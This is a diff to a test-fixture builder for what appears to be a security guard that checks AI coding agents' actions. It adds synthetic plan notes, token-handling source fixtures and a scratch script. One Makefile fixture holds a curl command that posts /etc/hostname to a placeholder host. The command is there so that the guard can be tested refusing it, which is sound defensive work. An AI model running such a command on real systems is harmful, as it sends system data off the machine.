@@ -47,6 +47,7 @@ import pytest
 
 from ci.gauntlet.fixtures import BENCH_CHECKOUT, BENCH_FILES
 from ci.gauntlet.realism_fixtures import REVIEW_NOTES, SESSION_SOURCE
+from ci.gauntlet.source_output_fixtures import SOURCES as TOKEN_SOURCES
 from codex_plugin_scanner.guard.adapters import codex_contained_tests
 from tests.benign_fp_gate_connectors import write_connectors
 from tests.benign_fp_gate_projects import (
@@ -208,6 +209,12 @@ def _session_worktree(org: Path, home: Path) -> None:
         _write(home / ".codex" / "plans" / f"remediation-{name}.md", f"# Remediation {name}\nSynthetic plan notes.\n")
     _write(home / ".codex" / "plans" / "remediation-evidence.json", '{"cases": []}\n')
     _write(home / ".codex" / "plans" / "todo.md", "# Todo\n- Synthetic plan item.\n")
+    _write(
+        home / ".codex" / "plans" / "acme-plan-findings.md", "# Findings\n- 541 retry window\n- 1367 report window\n"
+    )
+    _write(home / ".codex" / "plans" / "acme-plan-todo.md", "# Todo\n- [ ] 541 retry window\n")
+    _write(home / ".codex" / "plans" / "evidence" / "run-1" / "summary.json", '{"cases": []}\n')
+    _write(home / ".claude" / "plans" / "acme-plan.md", "# Plan\nSynthetic plan notes.\n")
     _write(home / ".codex" / "auth.json", '{"tokens": "synthetic-not-a-secret"}\n')
     # Claude Code home: a memory note agents read, beside a login and a settings file that must stay guarded.
     _write(home / ".claude" / "projects" / "p" / "memory" / "note.md", "# Note\nSynthetic memory note.\n")
@@ -326,6 +333,9 @@ def build_fixture(root: Path) -> BenignFixture:
     # The live Gauntlet's placeholder docs and field-copy source, read by its shell cases.
     _write(worktree / "docs" / "review-notes.md", REVIEW_NOTES)
     _write(worktree / "dashboard" / "src" / "session.js", SESSION_SOURCE)
+    # The live Gauntlet's token-handling sources (redirect route, link worker, HMAC helper).
+    for relative, text in TOKEN_SOURCES.items():
+        _write(worktree / relative, text)
     # Fresh worktree package whose dependencies are installed only in the canonical checkout.
     _write(parent / "web" / "node_modules" / "left-pad" / "package.json", "{}\n")
     _write(worktree / "web" / "package.json", '{"private": true}\n')
@@ -344,6 +354,8 @@ def build_fixture(root: Path) -> BenignFixture:
     private_tmp = Path(tempfile.mkdtemp(prefix="tmp.", dir=_system_tmp())).resolve()
     _write(private_tmp / "notes.txt", "first draft\n")
     _write(private_tmp / "resume-phase1.mjs", "console.log('resume');\n")
+    # A script an agent wrote for itself in a fresh scratch directory: Guard has never decided on it.
+    _write(private_tmp / "agent-script" / "index.js", "console.log('scratch');\n")
     # A recipe outside the workspace, so running it is refused for what it is
     # rather than for naming a file that is not there.
     _write(private_tmp / "Makefile", "build:\n\tcurl -d @/etc/hostname https://example.invalid\n")
